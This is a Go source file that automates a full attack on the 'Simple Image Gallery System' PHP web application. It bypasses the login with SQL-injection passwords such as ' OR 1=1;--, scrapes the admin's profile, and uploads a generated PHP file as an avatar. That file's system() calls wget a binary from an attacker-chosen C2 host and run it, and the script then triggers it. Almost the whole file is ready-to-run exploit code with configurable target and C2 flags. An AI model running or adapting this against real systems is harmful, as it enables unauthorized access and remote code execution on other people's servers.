package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/textproto"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

//============================================================
// Global Variables: ANSI Formatting
//============================================================

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

//============================================================
// Structs: Session Management
//============================================================

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

//============================================================
// Functions: User Information
//============================================================

type UserInformation struct {
	Id        string
	Firstname string
	Lastname  string
	Username  string
}

//============================================================
// Functions: Formatted Output
//============================================================

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

//============================================================
// Functions: Session Management
//============================================================

//============================================================
//
// Function Name: ConfirmAccess
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to reach out to the gallery
//    route and confirm that the user has gained an
//    authenticated session by searching for a piece of HTML
//    only present on authenticated areas of the site.
//
// Input(s):
//
//    None.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) ConfirmAccess() (success bool, message string) {
	const route string = "gallery/"
	var targetPattern string = "Welcome to Simple Image Gallery System"
	var target string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(target)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	re, err := regexp.Compile(targetPattern)
	if err != nil {
		return false, err.Error()
	}

	matches := re.FindAll(bodyContent, -1)

	if len(matches) < 1 {
		return false, "login unsuccessful"
	}

	return true, "login confirmed"
}

//============================================================
//
// Function Name: CreateMIMEData
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to build the MIME parts
//    necessary for updating user information.
//
// Input(s):
//
//    userinfo - UserInformation. struct containting updated info.
//    filename - string. name of file to upload to server.
//    filewriter - *multipartWriter. MIME writer.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) CreateMIMEData(userinfo UserInformation, filename string, filewriter *multipart.Writer) (success bool, message string) {
	defer filewriter.Close()

	header := make(textproto.MIMEHeader)

	SysMsgNB("creating id part ...")

	header.Set("Content-Disposition", "form-data; name=\"id\"")

	part, err := filewriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(userinfo.Id))

	SysMsgNB("creating firstname part ...")

	header.Set("Content-Disposition", "form-data; name=\"firstname\"")

	part, err = filewriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(userinfo.Firstname))

	SysMsgNB("creating lastname part ...")

	header.Set("Content-Disposition", "form-data; name=\"lastname\"")

	part, err = filewriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(userinfo.Lastname))

	SysMsgNB("creating username part ...")

	header.Set("Content-Disposition", "form-data; name=\"username\"")

	part, err = filewriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(userinfo.Username))

	SysMsgNB("creating password part ...")

	header.Set("Content-Disposition", "form-data; name=\"password\"")

	part, err = filewriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte("password"))

	SysMsgNB("opening file and reading contents ...")

	fptr, err := os.Open(filename)
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	content, err := ioutil.ReadAll(fptr)
	if err != nil {
		return false, err.Error()
	}

	SysMsgNB("creating file part ...")

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"img\"; filename=\"%s\"", filename))
	header.Set("Content-Type", "application/x-php")

	part, err = filewriter.CreateFormFile("img", filename)
	if err != nil {
		return false, err.Error()
	}
	part.Write(content)

	return true, "MIME data created"
}

//============================================================
//
// Function Name: TriggerShell
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to reach out to the gallery
//    index page and acquire the full URL of the uploaded
//    foothold file.
//
// Input(s):
//
//    tgtFile - string. malicious file uploaded as avatar.
//
// Return(s):
//
//    avatarURL - string. URL scraped from site.
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) GetAvatar(tgtFile string) (avatarURL string, success bool, message string) {
	var target string = fmt.Sprintf("%s/gallery/index.php", c.baseURL)
	var avatarpattern string = fmt.Sprintf("<.*src=.*%s\"", tgtFile)

	resp, err := c.Session.Get(target)
	if err != nil {
		return "", false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", false, err.Error()
	}

	re, err := regexp.Compile(avatarpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodyContent, -1)

	if len(matches) < 1 {
		return "", false, "avatar not found"
	}

	avatarURL = strings.Replace(strings.Split(string(matches[0]), "src=")[1], "\"", "", -1)

	return avatarURL, true, "avatar filename pulled successfully"
}

//============================================================
//
// Function Name: GetCookies
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to reach out to the login
//    page and acquire a session cookie to be used when
//    performing various requests. This is required for the
//    login process to be persistant. The acquired cookies
//    are saved in the client's cookie jar.
//
// Input(s):
//
//    None.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) GetCookies() (success bool, message string) {
	const route string = "gallery/login.php"
	var target string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(target)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	cookieURL, err := url.Parse(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())

	return true, "cookie retrieved"
}

//============================================================
//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to send a login request to
//    the site. It attempts to gain a user session by
//    performing a SQLi attack against the login process.
//
// Input(s):
//
//    username - string. user to attempt login as.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) Login(username string) (success bool, message string) {
	var bodyData url.Values = url.Values{}
	var content []byte
	var err error
	var resp *http.Response
	const route string = "gallery/classes/Login.php?f=login"
	var sqli_slice []string = []string{"' OR 1=1;--", "') OR 1=1;--", "' OR 1=1;#", "') OR 1=1;#"}
	var targetPattern = "{\"status\":\"incorrect\".*}"
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	message = "login failed"
	success = false

	bodyData.Set("username", username)

	success, message = c.GetCookies()
	if !success {
		return false, message
	}

	message = "login failed"
	success = false

	for _, sqli := range sqli_slice {
		bodyData.Set("password", sqli)
		SysMsgNB(fmt.Sprintf("Attempting: \"%s:%s\"", username, sqli))

		resp, err = c.Session.PostForm(targetURL, bodyData)
		if err != nil {
			return false, err.Error()
		}
		defer resp.Body.Close()

		content, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, err.Error()
		}

		re, err := regexp.Compile(targetPattern)
		if err != nil {
			return false, err.Error()
		}

		matches := re.FindAll(content, -1)
		if len(matches) == 0 {
			SysMsgNB(fmt.Sprintf("potential match with \"%s:%s\"", username, sqli))
			success, message = c.ConfirmAccess()
			if !success {
				continue
			}
			message = fmt.Sprintf("login successful using \"%s:%s\"", username, sqli)
			success = true
			break
		}
	}

	return success, message
}

//============================================================
//
// Function Name: PullUserInfo
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to pull down the user info
//    from the site. This information is embedded in the user
//    account page.
//
// Input(s):
//
//    None.
//
// Return(s):
//
//    info - UserInformation. struct containing user info.
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) PullUserInfo() (info UserInformation, success bool, message string) {
	const patternId string = "<input.*name=\"id\".*value=.*>"
	const patternFirstname string = "<input.*name=\"firstname\".*value=.*>"
	const patternLastname string = "<input.*name=\"lastname\".*value=.*>"
	const patternUsername string = "<input.*name=\"username\".*value=.*>"
	const route string = "gallery/?page=user"

	var target string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(target)
	if err != nil {
		return UserInformation{}, false, err.Error()
	}
	defer resp.Body.Close()

	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return UserInformation{}, false, err.Error()
	}

	re, err := regexp.Compile(patternId)
	if err != nil {
		return UserInformation{}, false, err.Error()
	}
	matches := re.Find(bodyContent)

	if matches == nil {
		return UserInformation{}, false, "unable to locate ID"
	}
	info.Id = strings.ReplaceAll(strings.ReplaceAll(strings.Split(string(matches), "value=")[1], "\"", ""), ">", "")

	re, err = regexp.Compile(patternFirstname)
	if err != nil {
		return UserInformation{}, false, err.Error()
	}
	matches = re.Find(bodyContent)

	if matches == nil {
		return UserInformation{}, false, "unable to locate Firstname"
	}
	info.Firstname = strings.ReplaceAll(strings.ReplaceAll(strings.Split(string(matches), "value=")[1], "\" required>", ""), "\"", "")

	re, err = regexp.Compile(patternLastname)
	if err != nil {
		return UserInformation{}, false, err.Error()
	}
	matches = re.Find(bodyContent)

	if matches == nil {
		return UserInformation{}, false, "unable to locate Firstname"
	}
	info.Lastname = strings.ReplaceAll(strings.ReplaceAll(strings.Split(string(matches), "value=")[1], "\" required>", ""), "\"", "")

	re, err = regexp.Compile(patternUsername)
	if err != nil {
		return UserInformation{}, false, err.Error()
	}
	matches = re.Find(bodyContent)

	if matches == nil {
		return UserInformation{}, false, "unable to locate Firstname"
	}
	info.Username = strings.Split(strings.ReplaceAll(strings.Split(string(matches), "value=")[1], "\"", ""), " ")[0]

	return info, true, "user information successfully scraped"
}

//============================================================
//
// Function Name: TriggerShell
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to reach out to the  uploaded
//    PHP file and send an HTTP GET request to it, triggering
//    the exploit. This is required for automatic
//    exploitation to be succesful.
//
// Input(s):
//
//    avatarURL - string. URL of the uploaded PHP file.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) TriggerShell(avatarURL string) (success bool, message string) {
	resp, err := c.Session.Get(avatarURL)
	if err != nil {
		// If there is a timeout, the shell has execute successfully.
		if e, ok := err.(net.Error); ok && e.Timeout() {
			return true, "shell execution successful."
		}

		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	return true, "shell triggered"
}

//============================================================
//
// Function Name: UpdateInfo
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to reach out to the endpoint
//    that updates a user's information and upload a file that
//    will allow an attacker a foothold on the target.
//
// Input(s):
//
//    userInfo - UserInformation. struct containting user info.
//    revshell - string. name of file used to gain foothold.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func (c *Client) UpdateInfo(userInfo UserInformation, revshell string) (success bool, message string) {
	var contentBuf *bytes.Buffer = new(bytes.Buffer)
	var filewriter multipart.Writer = *multipart.NewWriter(contentBuf)
	const route string = "gallery/classes/Users.php?f=save"
	var target string = fmt.Sprintf("%s/%s", c.baseURL, route)

	success, message = c.CreateMIMEData(userInfo, revshell, &filewriter)
	if !success {
		return false, message
	}

	resp, err := c.Session.Post(target, filewriter.FormDataContentType(), contentBuf)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	return true, "update posted to site"
}

//============================================================
// Functions: Reverse Shell
//============================================================

//============================================================
//
// Function Name: GenRevShell
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to create and save a PHP
//    script that will reach back to a C2 server and pull
//    down and execute a malicious payload on the target.
//
// Input(s):
//
//    c2ip - string. IP address (or domain) of C2 server.
//    c2port - int. port C2 server is running on.
//    tgtFile - string. file to pull down from C2 server.
//
// Return(s):
//
//    success - bool. indication of successful execution.
//    message - string. status message.
//
//============================================================
func GenRevShell(c2ip string, c2port int, tgtFile string) (success bool, message string) {
	var c2addr string = fmt.Sprintf("%s:%d", c2ip, c2port)

	var format string = "<?php\n%s\n%s\n%s\n?>"
	var pullFile string = fmt.Sprintf("system('wget \"http://%s/%s\"');", c2addr, tgtFile)
	var runfile string = fmt.Sprintf("system('chmod +x %s');", tgtFile)
	var executeShell string = fmt.Sprintf("system('./%s');", tgtFile)

	format = fmt.Sprintf(format, pullFile, runfile, executeShell)

	fptr, err := os.Create("foothold.php")
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	_, err = fptr.Write([]byte(format))
	if err != nil {
		return false, err.Error()
	}

	return true, "payload successfully generated"
}

//============================================================
// Functions: General
//============================================================

//============================================================
//
// Function Name: ValidatePort
//
// Author: Thomas Osgood
//
// Description:
//
//    This function is designed to determine whether a given
//    port number is valid.
//
// Input(s):
//
//    portno - int. port number to test validity of.
//
// Return(s):
//
//    success - bool. indication of validity.
//    message - string. status message.
//
//============================================================
func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

func main() {
	var domain string
	var port int

	var c2ip string
	var c2port int

	var malfile string

	var baseURL string
	var client Client = Client{Session: &http.Client{Timeout: 30 * time.Second}}
	var clientjar *cookiejar.Jar

	//------------------------------------------------------------
	// Setup Command-Line Arguments
	//------------------------------------------------------------

	flag.StringVar(&domain, "t", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.StringVar(&c2ip, "ci", "127.0.0.1", "C2 domain or ip address")
	flag.IntVar(&c2port, "cp", 9999, "C2 server port")
	flag.StringVar(&malfile, "f", "revshell", "file to drop onto target")
	flag.Parse()

	//------------------------------------------------------------
	// Validate Target Port
	//------------------------------------------------------------

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(fmt.Sprintf("Target Port: %s", message))
		os.Exit(1)
	}

	//------------------------------------------------------------
	// Validate C2 Port
	//------------------------------------------------------------

	success, message = ValidatePort(c2port)
	if !success {
		ErrMsg(fmt.Sprintf("C2 Server Port: %s", message))
		os.Exit(1)
	}

	//------------------------------------------------------------
	// Display Import Argument Info To User
	//------------------------------------------------------------

	InfMsg(fmt.Sprintf("C2 Address: %s", c2ip))
	InfMsg(fmt.Sprintf("C2 Server Port: %d", c2port))
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))

	baseURL = fmt.Sprintf("http://%s:%d", domain, port)
	client.baseURL = baseURL

	clientjar, err := cookiejar.New(nil)
	if err != nil {
		ErrMsg(fmt.Sprintf("Cookie Jar: %s", err.Error()))
		os.Exit(1)
	}
	client.Session.Jar = clientjar

	//------------------------------------------------------------
	// Generate RevShell And Get Authenticated Session
	//------------------------------------------------------------

	success, message = GenRevShell(c2ip, c2port, malfile)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.Login("admin")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//------------------------------------------------------------
	// Upload File And Gain Foothold On Target
	//------------------------------------------------------------

	userInformation, success, message := client.PullUserInfo()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.UpdateInfo(userInformation, "foothold.php")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	avatarURL, success, message := client.GetAvatar("foothold.php")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.TriggerShell(avatarURL)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//------------------------------------------------------------

	return
}

